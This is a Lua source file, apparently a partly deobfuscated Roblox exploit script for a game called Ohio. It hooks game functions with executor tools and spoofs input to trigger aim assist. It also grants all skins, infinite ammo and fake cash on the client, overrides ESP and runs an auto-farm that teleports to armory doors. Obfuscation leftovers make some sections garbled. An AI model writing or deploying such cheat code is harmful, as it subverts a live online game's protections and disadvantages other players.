							for _, v10 in require(ReplicatedStorage.devv.shared.Indicies.mobileDealer), nil, nil do
								for _, v11 in v10, nil, nil do
									v11.stock = 9e9
								end
							end

							Connect(GetPropertyChangedSignal(LocalPlayer.PlayerGui.Backpack, "Enabled"), function()
								LocalPlayer.PlayerGui.Backpack.Holder.Locker.Visible =
									LocalPlayer.PlayerGui.Backpack.Enabled
							end)

							pcall(function()
								Connect(workspace.Sounds.Effects.ChildAdded, function(arg)
									local connect = nil

									local function fn68(arg2)
										if arg2.Name == "grabPlayer" then
											arg2:Stop()
											arg:Destroy()
											pcall(Disconnect, connect)
										end
									end

									connect = Connect
									connect = connect(arg.ChildAdded, fn68)
								end)
							end)

							local load = require(ReplicatedStorage.devv).load

							require(ReplicatedStorage.devv.client.Handlers.GrabHandler);

							(function()
								trig = D[1]("trig")
								GUID = D[1]("GUID")
								Maid = D[1]("Maid")
								state = D[1]("state")
								skins = D[1]("skins")
								v3sfx = D[1]("v3sfx")
								v3item = D[1]("v3item")
								Signal = D[1]("Signal")
								v3items = D[1]("v3items")
								rewards = D[1]("rewards")
								v3sound = D[1]("v3sound")
								OhioRaycast = D[1]("Raycast")
								v3effect = D[1]("v3effect")
								makeToast = D[1]("makeToast")
								GUILoader = D[1]("GUILoader")
								dialogQueue = D[1]("dialogQueue")
								InputHandler = D[1]("InputHandler")
								specialRoles = D[1]("specialRoles")
								ClientEaster = D[1]("ClientEaster")
								ClientRagdoll = D[1]("ClientRagdoll")
								LimitedEvents = D[1]("LimitedEvents")
								RetrieveModel = D[1]("RetrieveModel")
								ClientReplicator = D[1]("ClientReplicator")
								nearbyPlayerUtil = D[1]("nearbyPlayerUtil")
								tutorialPulseEffect = D[1]("tutorialPulseEffect")
								CameraShaker = require(ReplicatedStorage.devv.vendor.CameraShaker)
								status = require(ReplicatedStorage.devv.client.Helpers.character.status)
								ClientEconomy = require(ReplicatedStorage.devv.client.Handlers.ClientEconomy)
								StickyHandler = require(ReplicatedStorage.devv.client.Handlers.StickyHandler)
								HitmarkerHandler = require(ReplicatedStorage.devv.client.Handlers.HitmarkerHandler)
								combatIndicator = require(ReplicatedStorage.devv.client.Helpers.ui.combatIndicator)
								DamageIndicator = require(ReplicatedStorage.devv.client.Helpers.ui.DamageIndicator)
								Houses = require(ReplicatedStorage.devv.client.Handlers.ClientHouse.PlotTypes.Houses)

								ClientHouseFurniture =
									require(ReplicatedStorage.devv.client.Handlers.ClientHouse.Furniture)

								FurnitureDefs = require(ReplicatedStorage.devv.shared.Indicies.furniture)
								ClientDestruction = require(ReplicatedStorage.devv.client.Handlers.ClientDestruction)

								itemButton =
									require(ReplicatedStorage.devv.client.Objects.v3item.modules.inventory.itemButton)

								updateMoney =
									require(ReplicatedStorage.devv.client.Handlers.PlayerDataHandler.updateFuncs.money)

								meleeHitreg =
									require(ReplicatedStorage.devv.client.Objects.v3item.modules.melee).meleeHitreg

								zoneUtils = require(ReplicatedStorage.devv.client.Helpers.hitreg.zoneUtils)
								inventory = v3item.inventory
								FireServer = Signal.FireServer
								LinkSignal = Signal.LinkSignal
								InvokeServer = Signal.InvokeServer
							end)()

							if setthreadidentity then
								pcall(setthreadidentity, oldTI or 8)
							end

							do
								local str3 = "Aim Assist Sens"
								local n4 = 0
								local n5 = 1
								local color = NewRGB(74, 202, 86)
								local color3 = NewRGB(175, 175, 175)
								local n6 = 75

								local function fn68(arg)
									for i = 1, #arg do
										local v10 = arg[i]
										if v10.displayName == str3 then
											return i, v10
										end
									end

									return nil, nil
								end

								local function fn69(arg)
									local sorts = FindFirstChild(arg, "Sorts")
									if not sorts then
										return "Game"
									end
									local children = GetChildren(sorts)

									for i = 1, #children do
										local v10 = children[i]
										if IsA(v10, "GuiObject") and v10.BackgroundTransparency < 0.9 then
											return v10.Name
										end
									end

									return "Game"
								end

								local function fn70(arg)
									local children = GetChildren(arg)
									local n7 = 0
									local n8 = 0

									for i = 1, #children do
										local v10 = children[i]

										if IsA(v10, "GuiObject") and v10.Visible then
											n7 += 1
											n8 += n6
										end
									end

									arg.CanvasSize = UDim2.fromOffset(0, n8 + n6 + Max(0, n7 - 1))
								end

								local function fn71(arg, arg2)
									local function fn72(arg3)
										local defaultValue = Clamp(
											math.round(((tonumber(arg2.defaultValue) or 0) + (arg3 or 0) * 0.1) * 10)
												/ 10,
											0,
											1
										)

										if defaultValue == 0 then
											SetAttribute(LocalPlayer, "aimAssistSensitivity", 0)
										else
											arg2.onUpdate(nil, defaultValue)
										end

										arg.Buttons.NumLabel.Text = tostring(defaultValue)
										arg.Buttons.Add.BackgroundColor3 = defaultValue >= n5 and color3 or color
										arg.Buttons.Subtract.BackgroundColor3 = defaultValue <= n4 and color3 or color
										arg2.defaultValue = defaultValue
										FireServer("updateSetting", arg2.displayName, defaultValue)
										return defaultValue
									end

									fn72()

									Connect(arg.Buttons.Add.Activated, function()
										fn72(1)
									end)

									Connect(arg.Buttons.Subtract.Activated, function()
										fn72(-1)
									end)
								end

								local function fn72(arg, arg2, arg3)
									if GetAttribute(arg2, "OhioBound") then
										return
									end
									local children = GetChildren(arg)

									for i = 1, #children do
										local v10 = children[i]

										if v10 ~= arg2 and v10.Name == str3 then
											v10:Destroy()
										end
									end

									Wait()

									if typeof(getconnections) == "function" then
										local tbl9 = { arg2.Buttons.Add, arg2.Buttons.Subtract }

										for i = 1, #tbl9 do
											local connections = GetConnections(tbl9[i].Activated)

											for i2 = 1, #connections do
												pcall(Disconnect, connections[i2])
											end
										end
									end

									fn71(arg2, arg3)
									SetAttribute(arg2, "OhioBound", true)

									if arg2.Visible then
										fn70(arg)
									end
								end

								local function fn73(layoutOrder, arg)
									local playerGui = FindFirstChild(LocalPlayer, "PlayerGui")
									if not playerGui then
										return false
									end
									local phone = FindFirstChild(playerGui, "Phone")
									if not phone then
										return false
									end
									local holder = FindFirstChild(phone, "Holder")
									holder = holder and FindFirstChild(holder, "ScreenContainer")
									holder = holder and FindFirstChild(holder, "SettingsApp")
									local settingsContainer = holder and FindFirstChild(holder, "SettingsContainer")
									if not settingsContainer then
										return false
									end

									if not GetAttribute(settingsContainer, "OhioWatched") then
										SetAttribute(settingsContainer, "OhioWatched", true)

										Connect(settingsContainer.ChildAdded, function(arg2)
											if arg2.Name == str3 then
												fn72(settingsContainer, arg2, arg)
											end
										end)
									end

									local clone = FindFirstChild(settingsContainer, "Aim Assist Sens")

									if
										GetAttribute(settingsContainer, "OhioWatched")
										and clone
										and GetAttribute(clone, "OhioBound")
									then
										return true
									end

									if not clone then
										if not (#GetChildren(settingsContainer) > 1) then
											return false
										end
										clone = ReplicatedStorage.Guis.Frames.SettingTicker:Clone()
										clone.Name = arg.displayName
										clone.LayoutOrder = layoutOrder
										clone.NameLabel.Text = arg.displayName
										SetAttribute(clone, "Id", layoutOrder)
										clone.Parent = settingsContainer
										clone.Visible = arg.sort == fn69(holder)
									end

									SetAttribute(clone, "Id", layoutOrder)
									clone.LayoutOrder = layoutOrder
									fn72(settingsContainer, clone, arg)
									return true
								end

								Spawn(function()
									local settingsData = require(
										ReplicatedStorage.devv.client.Objects.v3item.bin.Phone.modules.controller.modules.phone.screens.SettingsApp.settingsData
									)

									local v10, v11 = fn68(settingsData)
									if not v11 then
										return
									end
									v11.device = nil
									local getStat = nil

									pcall(function()
										getStat = InvokeServer("getStat", "settings")
									end)

									local aimAssistSensitivity = GetAttribute(LocalPlayer, "aimAssistSensitivity")

									if type(getStat) == "table" and getStat[str3] ~= nil then
										aimAssistSensitivity = getStat[str3]
									end

									local defaultValue = tonumber(aimAssistSensitivity) or v11.defaultValue or 1
									v11.onUpdate(nil, defaultValue)
									v11.defaultValue = Clamp(defaultValue, 0, 1)

									Spawn(function()
										while true do
											fn73(v10, v11)
											Wait(0.25)
										end
									end)
								end)
							end

							local v10 = nil

							v10 = hookfunction(InputHandler.GetInputType, function(...)
								local v11 = debug.traceback()
								if v11:find("Gun") and v11:find("controller") then
									return "Touch"
								end
								return v10(...)
							end)

							local tbl9
							tbl9 = { "Heavy Vest", "Medium Vest", "Light Vest" }
							local new
							new = CameraShaker.new
							local tbl10
							tbl10 = {}
							local tbl11
							tbl11 = {}
							local tbl12
							tbl12 = {}
							local tbl13
							tbl13 = {}
							local tbl14
							tbl14 = {}
							local tbl15
							tbl15 = {}
							local tbl16
							tbl16 = {}
							local tbl17
							tbl17 = {}
							local tbl18
							tbl18 = {}
							local tbl19
							tbl19 = {}
							local tbl20
							tbl20 = {}
							local tbl21
							tbl21 = {}
							local tbl22
							tbl22 = {}
							local tbl23
							tbl23 = {}
							local tbl24
							tbl24 = {}
							local flag
							flag = false
							local flag2
							flag2 = false
							local tbl25
							tbl25 = { BalloonTarget = nil, Kunai = false, CandyCane = false, Scythe = false }

							do
								local n4 = 8

								local function fn68()
									local H, m = GetDescendants(ReplicatedStorage.devv.shared.Indicies.v3items), 0

									for h = 1, #H, 1 do
										local B = H[h]

										if IsA(B, "ModuleScript") then
											if B.Parent.Name == "Gun" then
												luraph_box(D[1])(D[2], D[3], B)
											elseif luraph_box(D[4])(B, "Wallet") then
												luraph_box(D[1])(D[5], D[6], B)
											else
												local H, t = Lower(B.Name), Lower(B.Parent.Name)

												if
													luraph_box(D[4])(B, "Holdable")
													or string.find(H, "balloon", 1, true) ~= nil
													or string.find(H, "kunai", 1, true) ~= nil
													or string.find(t, "balloon", 1, true) ~= nil
													or string.find(t, "kunai", 1, true) ~= nil
												then
													local H, t = pcall(require, B)
													m += 1

													if m >= D[7] then
														Wait()
														m = 0
													end

													if H and type(t) == "table" then
														h = t.name or B.Name

														if t.holdableType == "Balloon" then
															luraph_box(D[1])(D[8], D[9], B, h)
														elseif t.holdableType == "Kunai" then
															luraph_box(D[1])(D[10], D[11], B, h)
														end
													end
												end
											end
										end
									end
								end

								local function fn69(arg, arg2)
									for _, v11 in pairs(arg) do
										if typeof(v11) == "Instance" and IsA(v11, "ModuleScript") then
											pcall(require, v11)
											arg2.n = arg2.n + 1

											if n4 <= arg2.n then
												arg2.n = 0
												Wait()
											end
										end
									end
								end

								local function fn70()
									Spawn(function()
										local tbl26 = { n = 0 }
										fn69(tbl13, tbl26)
										fn69(tbl15, tbl26)
										fn69(tbl17, tbl26)
										fn69(tbl19, tbl26)
									end)
								end

								fn68()
								Sort(tbl14)
								Sort(tbl16)
								Sort(tbl18)
								Sort(tbl20)
								fn70()
							end

							(function()
								local H = GetChildren(ReplicatedStorage.devv.shared.Indicies.v3effects.bin)

								for m = 1, #H, 1 do
									local h = H[m]
									D[1][h.Name] = {}
									Insert(D[2], h.Name)
									m = GetChildren(h)

									for H = 1, #m, 1 do
										local B = m[H]

										if IsA(B, "ModuleScript") then
											Insert(D[1][h.Name], B.Name)
										end
									end
								end
							end)()

							Sort(tbl12)
							local fn68

							fn68 = function(D)
								D = D or LocalPlayer
								return D and D.Character
							end

							local fn69

							fn69 = function(H)
								local m = D[1](H)
								return m and (FindFirstChildOfClass(m, "Humanoid"))
							end

							local fn70

							fn70 = function(H)
								local m = D[1](H)
								return m and (FindFirstChild(m, "HumanoidRootPart"))
							end

							local fn71

							fn71 = function(D, H)
								for m, m in pairs(inventory.items or {}) do
									if m and (m.name == D or m.guid == D or m.type == D or m.subtype == D) then
										if H and m.isStashed then
											continue
										end
										return m
									end
								end
							end

							local fn72

							fn72 = function(H)
								return D[1](H) ~= nil
							end

							local fn73

							fn73 = function(arg)
								return v3item.GetEquipped(arg or LocalPlayer)
							end

							local function fn74(arg, arg2)
								if not arg2 and typeof(arg) == "Instance" then
									if IsA(arg, "Player") then
										arg2 = arg
									else
										arg2 = Players:GetPlayerFromCharacter(arg)
									end
								end

								if not arg2 then
									return ""
								end
								local v11 = v3item.GetEquipped(arg2)

								if type(v11) == "table" then
									local name2 = v11.name or v11.Name
									if type(name2) == "string" then
										return name2
									end
									return ""
								end

								if type(v11) == "string" then
									return v11
								end
								return ""
							end

							if RobloxESP and typeof(RobloxESP.Override) == "function" then
								RobloxESP:Override({ GetTool = fn74 })
							end

							local fn75

							fn75 = function(arg)
								if arg then
									pcall(inventory.setEquipped, arg)
								end
							end

							local fn76, fn77, fn78, flag3, fn79, fn80, fn81, fn82, fn83, fn84
							local fn85, fn86, fn87, fn88

							do
								local function fn89()
									pcall(inventory.unequipAll)
								end

								fn76 = function(arg)
									local v11 = fn71(arg)
									if not arg or not v11 or v11.isStashed then
										return
									end
									FireServer("removeItem", arg)
								end

								local function fn90(arg)
									return (arg - NewVector3(393.817017, 15.3763409, -1385.31653)).Magnitude < 200
								end

								local function fn91(arg)
									return (arg - NewVector3(601.762817, 29.3132324, -909.026794)).Magnitude < 200
								end

								fn77 = function(arg)
									if not arg or not IsA(arg, "BasePart") then
										return
									end
									arg.AssemblyLinearVelocity = EmptyVector3
									arg.AssemblyAngularVelocity = EmptyVector3
								end

								fn78 = function(arg, cFrame, arg2)
									local n4 = tick() + arg2

									while tick() < n4 do
										if not arg.Parent then
											return
										end
										arg.CFrame = cFrame
										fn77(arg)
										Wait(0.05)
									end
								end

								flag3 = nil

								fn79 = function(cFrame, arg)
									if typeof(cFrame) ~= "CFrame" or not arg or arg <= 0 then
										return
									end
									local n4 = tick() + arg

									while true do
										if tick() < n4 and not flag3 then
											local v11 = fn70()

											if v11 then
												v11.CFrame = cFrame
												fn77(v11)
												RunService.Heartbeat:Wait()
												continue
											end
										end

										break
									end

									fn77(fn70())
								end

								local n4 = 2
								local n5 = 2
								local tbl26 = {}
								local tbl27 = {}

								local function fn92(arg)
									local v11 = tbl26[arg]
									if v11 and v11.Parent then
										return v11
									end
									local game_ = FindFirstChild(workspace, "Game")
									local props = game_ and FindFirstChild(game_, "Props")
									local door = props and FindFirstChild(props, "Door")
									if not door then
										return nil
									end
									local children = GetChildren(door)

									for i = 1, #children do
										local v12 = children[i]
										if GetAttribute(v12, "keycardName") == arg then
											tbl26[arg] = v12
											return v12
										end
									end

									return nil
								end

								local function fn93(arg, arg2, arg3)
									local v11 = fn70()
									if not arg2 or not v11 then
										return false
									end
									local v12 = fn92(arg)
									if v12 and GetAttribute(v12, "isOpen") then
										return true
									end
									local v13 = tbl27[arg]
									if v13 and tick() - v13 < n5 then
										return true
									end
									fn75(arg2.guid)
									fn78(v11, arg3, 0.5)
									local n6 = tick() + n4
									local n7 = 0
									local flag4

									while true do
										flag4 = false

										if not (tick() < n6) then
											break
										else
											n7 += 1

											if InvokeServer("customAction", arg2.guid, "swipe") then
												flag4 = true
												break
											elseif v12 and GetAttribute(v12, "isOpen") then
												flag4 = true
												break
											else
												fn78(v11, arg3, 0.5)
											end
										end
									end

									if flag4 then
										tbl27[arg] = tick()
										fn78(v11, arg3, 0.3)
									end

									print(
										Format(
											"[OhioAutoFarm][Armory] %s opened=%s attempts=%d",
											arg,
											tostring(flag4),
											n7
										)
									)

									return flag4
								end

								local function fn94()
									local newCFrame = NewCFrame

									return fn93(
										"militaryArmory",
										fn71("Military Armory Keycard", true),
										newCFrame(393.817017, 15.3763409, -1385.31653)
									)
								end

								local function fn95()
									local newCFrame = NewCFrame

									return fn93(
										"policeArmory",
										fn71("Police Armory Keycard", true),
										newCFrame(601.762817, 29.3132324, -909.026794)
									)
								end

								fn80 = function(arg)
									if not arg then
										return false
									end
									local position = arg.Position
									if fn90(position) and not fn72("Military Armory Keycard", true) then
										return false
									end

									if fn91(position) and not fn72("Police Armory Keycard", true) then
										return false
									end
									return true
								end

								fn81 = function(arg)
									if not arg then
										return false
									end
									local position = arg.Position
									if fn90(position) then
										return fn94()
									end

									if fn91(position) then
										return fn95()
									end
									return true
								end

								ohioCloneValue = function(arg, arg2)
									if type(arg) ~= "table" then
										return arg
									end
									arg2 = arg2 or {}
									if arg2[arg] then
										return arg2[arg]
									end
									local tbl28 = {}
									arg2[arg] = tbl28

									for k, v11 in pairs(arg) do
										tbl28[ohioCloneValue(k, arg2)] = ohioCloneValue(v11, arg2)
									end

									return tbl28
								end

								local function fn96(arg)
									local tbl28 = {}

									if typeof(arg) == "string" then
										if arg ~= "None" and arg ~= "" then
											tbl28[arg] = true
										end

										return tbl28
									end

									local v11 = pairs
									arg = arg or {}

									for k, v12 in v11(arg) do
										if not (typeof(v12) == "boolean" and v12 == true) then
											if typeof(v12) ~= "table" then
												k = v12
											else
												k = v12.Value or v12.Title or v12.Name or v12.Text
											end
										end

										if typeof(k) == "string" and k ~= "None" and k ~= "" then
											tbl28[k] = true
										end
									end

									return tbl28
								end

								fn82 = function(arg)
									local tbl28 = {}

									for k in pairs(fn96(arg)) do
										Insert(tbl28, k)
									end

									Sort(tbl28)
									return tbl28
								end

								local function fn97(arg)
									if not arg then
										return false
									end
									local flag4 = tbl10[arg] ~= nil
									tbl10[arg] = nil
									pcall(inventory.remove, arg)
									local currentItemsData = inventory.currentItemsData or {}

									for i = #currentItemsData, 1, -1 do
										local v11 = inventory.currentItemsData[i]

										if v11 and v11.guid == arg then
											Remove(inventory.currentItemsData, i)
											flag4 = true
										end
									end

									local v11 = fn73()

									if v11 and v11.guid == arg then
										pcall(inventory.setEquipped, nil)
									end

									if flag4 then
										inventory.update(inventory.currentItemsData)
									end

									return flag4
								end

								local function fn98(arg, arg2)
									if not arg then
										return false
									end
									local name2 = nil

									if arg2 then
										local ok4, result4 = pcall(require, arg2)

										if ok4 and type(result4) == "table" then
											name2 = result4.name
										end
									end

									local function fn99(arg3)
										if arg3 then
											arg3 = arg3.name == arg
												or arg3.name == name2
												or arg3._moonSelectionName == arg
										end

										return arg3
									end

									local tbl28 = {}

									for k, v11 in pairs(tbl10) do
										if fn99(v11) then
											Insert(tbl28, k)
										end
									end

									local flag4 = false

									for i = 1, #tbl28 do
										flag4 = fn97(tbl28[i]) or flag4
									end

									local v11 = pairs
									local items = inventory.items or {}

									for k, item in v11(items) do
										if fn99(item) and (tbl10[k] or item._moonClientItem) then
											flag4 = fn97(k) or flag4
										end
									end

									local currentItemsData = inventory.currentItemsData or {}

									for i = #currentItemsData, 1, -1 do
										local v12 = inventory.currentItemsData[i]
										local guid = v12 and v12.guid

										if fn99(v12) and (not guid or tbl10[guid] or v12._moonClientItem) then
											if guid then
												tbl10[guid] = nil
												pcall(inventory.remove, guid)
											end

											Remove(inventory.currentItemsData, i)
											flag4 = true
										end
									end

									if flag4 then
										inventory.update(inventory.currentItemsData)
									end

									return flag4
								end

								fn83 = function(arg, arg2)
									local v11 = fn96(arg2)
									local v12 = pairs
									arg = arg or {}
									local flag4 = false

									for k, v13 in v12(arg) do
										if not v11[k] then
											flag4 = fn98(k, v13) or flag4
										end
									end

									if flag4 then
										inventory.update(inventory.currentItemsData)
									end
								end

								local function fn99(arg, arg2)
									return arg ~= nil and (arg._moonSelectionName == arg2 or arg.name == arg2)
								end

								local function fn100(arg)
									if type(arg) ~= "string" or arg == "" then
										return nil
									end

									for _, v11 in pairs(tbl10) do
										if fn99(v11, arg) then
											return v11
										end
									end

									return nil
								end

								local function fn101(arg)
									if not (arg and arg.guid) then
										return
									end

									if not (inventory.items and inventory.items[arg.guid]) then
										inventory.add(arg, false, nil)
									end

									local currentItemsData = inventory.currentItemsData
									if type(currentItemsData) ~= "table" then
										return
									end

									for i = 1, #currentItemsData do
										local v11 = currentItemsData[i]
										if v11 and v11.guid == arg.guid then
											inventory.update(currentItemsData)
											return
										end
									end

									Insert(currentItemsData, arg)
									inventory.update(currentItemsData)
								end

								fn84 = function(arg)
									Sort(arg, function(arg2, arg3)
										return arg2.index < arg3.index
									end)

									local tbl28 = {}
									local tbl29 = {}

									for i = 1, #arg do
										local v11 = arg[i]
										local item = v11.item
										local guid = item and item.guid

										if item then
											item = item._moonSelectionName or item.name
										end

										if guid and type(item) == "string" and item ~= "" and tbl28[item] then
											tbl10[guid] = nil
										else
											if type(item) == "string" and item ~= "" then
												tbl28[item] = true
											end

											Insert(tbl29, v11)
										end
									end

									return tbl29
								end

								local function fn102(arg, moonSelectionName)
									if
										type(moonSelectionName) ~= "string"
										or moonSelectionName == ""
										or moonSelectionName == "None"
									then
										return
									end

									if fn71(moonSelectionName) then
										return
									end
									local v11 = fn100(moonSelectionName)
									if v11 then
										fn101(v11)
										return
									end
									arg = arg and arg[moonSelectionName]
									if not arg then
										return
									end
									local ok4, result4 = pcall(require, arg)
									if not ok4 or type(result4) ~= "table" then
										return
									end
									local v12 = ohioCloneValue(result4)
									v12.guid = GUID()
									v12._moonClientItem = true
									v12._moonSelectionName = moonSelectionName

									if v12.ammo then
										v12.ammo = math.huge
									end

									tbl10[v12.guid] = v12
									inventory.add(v12, false, nil)
									Insert(inventory.currentItemsData, v12)
									inventory.update(inventory.currentItemsData)
								end

								fn85 = function()
									Spawn(function()
										while Wait(0.5) do
											for k in pairs(fn96(tbl21)) do
												fn102(tbl13, k)
											end

											for k in pairs(fn96(tbl22)) do
												fn102(tbl15, k)
											end

											for k in pairs(fn96(tbl23)) do
												fn102(tbl17, k)
											end
										end
									end)
								end

								fn86 = function(D)
									local H, m = pcall(ClientReplicator.Get, D, "knocked")
									local h, B = pcall(ClientReplicator.Get, D, "crawl")
									return H and m == true or h and B == true
								end

								fn87 = function(arg)
									local v11 = fn70()
									if not v11 then
										return
									end
									local n6 = tonumber(arg) or 10000
									ClientEconomy.MakeLocalCash("fake cash", v11.CFrame, n6, n6, NewVector3(5, 10, 0))
								end

								fn88 = function()
									local Skins =
										require(ReplicatedStorage.devv.client.Helpers.ui.screens.CaseMenu.Skins)

									local skinUpdate = inventory.skinUpdate

									local function skinUpdate2(arg, arg2)
										local v11, v12, v13 = pairs(inventory.items or {})
										local flag4 = false
										local flag5 = true

										for _, v14 in v11, v12, v13 do
											if v14.name == arg then
												local flag6 = arg2 and v14.skin and v14.skin.name == arg2
												flag4 = true

												if not flag6 then
													flag5 = false
												end
											end
										end

										if flag4 and flag5 then
											return
										end
										local v14 = pairs
										local items = inventory.items or {}

										for _, item in v14(items) do
											if item.name == arg and item.skin then
												local skin = item.skin
												pcall(skin.Unequipped, skin)
												pcall(skin.Destroy, skin)

												if item.skin == skin then
													item.skin = nil
												end
											end
										end

										return skinUpdate(arg, arg2)
									end

									inventory.skinUpdate = skinUpdate2

									pcall(function()
										local v11 = hookfunction
										local attemptEquip = Skins.AttemptEquip

										local v12 = luraph_runtime1(function(arg, arg2, arg3)
											if arg:IsSkinEquipped(arg2, arg3) then
												arg3 = nil
											end

											state.data.equippedSkins[arg2] = arg3
											fn89()
											skinUpdate2(arg2, arg3)
											arg:_setEquipped(arg2, arg3)
											return true
										end)

										v11(attemptEquip, v12)
									end)

									local children = GetChildren(ReplicatedStorage.devv.shared.Indicies.skins.bin)

									for i = 1, #children do
										local children2 = GetChildren(children[i])

										for i2 = 1, #children2 do
											local v11 = children2[i2]

											if IsA(v11, "ModuleScript") then
												local ok4, result4 = pcall(require, v11)

												if ok4 and result4 and type(result4.compatabilities) == "table" then
													for _, compatability in pairs(result4.compatabilities) do
														state.data.ownedSkins[compatability] = state.data.ownedSkins[compatability]
															or {}

														state.data.ownedSkins[compatability][v11.Name] = 1
													end
												end

												if
													ok4
													and result4
													and skins
													and skins.compatabilities
													and skins.compatabilities.Generic
												then
													local displayName = result4.displayName or v11.Name

													for _, v12 in pairs(skins.compatabilities.Generic) do
														state.data.ownedSkins[v12] = state.data.ownedSkins[v12] or {}
														state.data.ownedSkins[v12][displayName] = 1
													end
												end
											end
										end
									end
								end
							end

							local fn89

							do
								local Wallet = fn71("Wallet")

								local tbl26 = {
									name = Wallet and Wallet.name or "Wallet",
									modelName = Wallet and Wallet.modelName or "Wallet",
									subtype = Wallet and Wallet.subtype or "Wallet",
								}

								tbl26.TPSOffsets = Wallet and ohioCloneValue(Wallet.TPSOffsets)
								tbl26.viewportOffsets = Wallet and ohioCloneValue(Wallet.viewportOffsets)

								local function fn90(arg)
									local v11 = tbl19[arg]

									if typeof(v11) == "Instance" then
										local ok4, result4 = pcall(require, v11)
										if ok4 and type(result4) == "table" then
											return result4
										end
										return nil
									end

									if type(v11) == "table" then
										return v11
									end
									return nil
								end

								fn89 = function(name2)
									local Wallet2 = fn71("Wallet")
									if not Wallet2 then
										return
									end
									local v11 = fn90(name2)
									local flag4 = name2 == "None" or not v11

									for _, v12 in pairs(getgc(true)) do
										if type(v12) == "table" and rawget(v12, "name") == "Wallet" then
											if flag4 then
												v12.name = tbl26.name
												v12.modelName = tbl26.modelName
												v12.subtype = tbl26.subtype
											else
												v12.name = name2
												v12.modelName = name2
												v12.subtype = "Wallet"

												if v12.TPSOffsets and v11.TPSOffsets then
													v12.TPSOffsets.hold = v11.TPSOffsets.hold
												end

												if
													v12.viewportOffsets
													and v12.viewportOffsets.hotbar
													and v11.hotbar
												then
													v12.viewportOffsets.hotbar.offset = v11.hotbar.offset
													v12.viewportOffsets.hotbar.rotoffset = v11.hotbar.rotoffset
												end
											end

											break
										end
									end

									if flag4 then
										Wallet2.name = tbl26.name
										Wallet2.modelName = tbl26.modelName
										Wallet2.subtype = tbl26.subtype

										if tbl26.TPSOffsets then
											Wallet2.TPSOffsets = ohioCloneValue(tbl26.TPSOffsets)
										end

										if tbl26.viewportOffsets then
											Wallet2.viewportOffsets = ohioCloneValue(tbl26.viewportOffsets)
										end
									else
										Wallet2.name = name2
										Wallet2.modelName = name2
										Wallet2.subtype = "Wallet"

										if Wallet2.TPSOffsets and v11.TPSOffsets then
											Wallet2.TPSOffsets.hold = v11.TPSOffsets.hold
										end

										if
											Wallet2.viewportOffsets
											and Wallet2.viewportOffsets.hotbar
											and v11.hotbar
										then
											Wallet2.viewportOffsets.hotbar.offset = v11.hotbar.offset
											Wallet2.viewportOffsets.hotbar.rotoffset = v11.hotbar.rotoffset
										end
									end

									if Wallet2.button and Wallet2.button.resetModelSkin then
										Wallet2.button:resetModelSkin()
									end

									if Wallet2.backpackButton and Wallet2.backpackButton.resetModelSkin then
										Wallet2.backpackButton:resetModelSkin()
									end
								end
							end

							local Balloon = require(ReplicatedStorage.devv.shared.Indicies.v3items.bin.Holdable.Balloon)
							ohioCloneValue(Balloon)
							local Balloon2 = fn71("Balloon")

							if Balloon2 then
								local tbl26 = {
									name = Balloon2.name,
									modelName = Balloon2.modelName,
									subtype = Balloon2.subtype,
									holdableType = Balloon2.holdableType,
									multiplier = Balloon2.multiplier,
									movespeedAdd = Balloon2.movespeedAdd,
									TPSOffsets = ohioCloneValue(Balloon2.TPSOffsets),
									viewportOffsets = ohioCloneValue(Balloon2.viewportOffsets),
								}
							end

							local fn90, fn91

							do
								local str3 = "balloon"
								local str4 = "kunai"
								local str5 = "candy"
								local str6 = "scythe"
								local str7 = "Kunai"
								local str8 = "Candy Cane"
								local str9 = "Scythe"

								local tbl26 = {
									"name",
									"modelName",
									"holdableType",
									"itemFuncName",
									"TPSOffsets",
									"viewportOffsets",
									"FPSOffsets",
									"itemAnimOffsets",
									"slashAnimName",
									"stabAnimName",
								}

								local function fn92(arg)
									if type(arg) ~= "string" or arg == "" then
										return nil
									end
									local ok4, result4 = pcall(v3items.getItemData, arg)
									if ok4 and type(result4) == "table" then
										return result4
									end
									return nil
								end

								local function fn93(arg)
									local tbl27 = {}

									for i = 1, #tbl26 do
										local v11 = tbl26[i]
										tbl27[v11] = ohioCloneValue(arg[v11])
									end

									return tbl27
								end

								local function fn94(arg, arg2, arg3)
									if not (arg and arg2) then
										return
									end

									for i = 1, #tbl26 do
										local v11 = tbl26[i]
										local v12 = arg2[v11]

										if v12 ~= nil then
											arg[v11] = ohioCloneValue(v12)
										elseif arg3 then
											arg[v11] = nil
										end
									end
								end

								local function fn95(arg, arg2)
									local v11 = tbl10[arg]

									if v11 then
										fn94(v11, arg2, true)
									end

									local currentItemsData = inventory.currentItemsData or {}

									for i = 1, #currentItemsData do
										local v12 = currentItemsData[i]
										if v12 and v12.guid == arg then
											v12.name = arg2.name
											break
										end
									end
								end

								local function fn96(arg)
									if not arg then
										return
									end
									local flag4 = arg.equipped == true

									if arg.model then
										pcall(function()
											arg.model:Destroy()
										end)

										arg.model = nil
									end

									if arg.button and arg.button.resetModelSkin then
										pcall(function()
											arg.button:resetModelSkin()
										end)
									end

									if arg.backpackButton and arg.backpackButton.resetModelSkin then
										pcall(function()
											arg.backpackButton:resetModelSkin()
										end)
									end

									if flag4 and arg.SetEquipped then
										pcall(function()
											arg:SetEquipped(false)
											arg:SetEquipped(true)
										end)
									end
								end

								local function fn97(arg, arg2)
									return arg2 == "Balloon" or type(arg) == "string" and tbl15[arg] ~= nil
								end

								local function fn98(arg, arg2)
									if not arg then
										return false
									end
									local guid = arg.guid and tbl24[arg.guid]
									guid = guid and guid.original
									local name2 = guid and guid.name or arg.name
									guid = guid and guid.holdableType or arg.holdableType
									if arg2 == str3 then
										return fn97(name2, guid)
									end

									if arg2 == str4 then
										return name2 == str7
									end

									if arg2 == str5 then
										return name2 == str8
									end

									if arg2 == str6 then
										return name2 == str9
									end
									return false
								end

								local function fn99(arg, recipeKey, targetName)
									if not (arg and arg.guid and targetName) then
										return false
									end
									local v11 = fn92(targetName)
									if not v11 then
										return false
									end
									local guid = arg.guid
									local tbl27 = tbl24[guid]

									if not tbl27 then
										tbl27 = { original = fn93(arg), recipeKey = recipeKey, targetName = targetName }
										tbl24[guid] = tbl27
									else
										tbl27.recipeKey = recipeKey
										tbl27.targetName = targetName
									end

									fn94(arg, tbl27.original, true)
									fn94(arg, v11, false)
									fn95(guid, arg)
									return true
								end

								local function fn100(arg, arg2)
									if not arg2 then
										return
									end
									local v11 = pairs
									local items = inventory.items or {}

									for _, item in v11(items) do
										if fn98(item, arg) then
											fn99(item, arg, arg2)
										end
									end
								end

								local function fn101()
									for k in pairs(tbl24) do
										local items = inventory.items and inventory.items[k]

										if items then
											fn96(items)
										end
									end
								end

								fn90 = function(arg, arg2)
